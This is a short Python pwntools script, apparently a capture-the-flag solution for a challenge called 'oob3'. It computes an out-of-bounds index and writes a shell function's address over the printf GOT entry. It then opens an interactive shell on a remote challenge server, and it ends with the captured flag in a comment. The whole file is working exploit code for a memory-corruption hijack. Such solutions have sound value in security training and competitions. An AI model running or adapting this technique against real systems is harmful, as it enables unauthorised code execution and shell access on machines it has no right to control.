from pwn import *
context.log_level = 'DEBUG'
# GOT hijacking
printf_addr = 0x601028
user_base_addr = 0x6010c0
shell = 0x400924

# p = process('./oob3')
p = remote('140.110.112.217',  3113)
p.recvuntil(b':')
offset = str(int((printf_addr-user_base_addr)/8)).encode()
p.sendline(offset)
p.recvuntil(b':')
p.sendline(pack(shell, 64, 'little'))
p.interactive()
# BreakALLCTF{Dmq1Qe1QYOhxae8KhxVc}
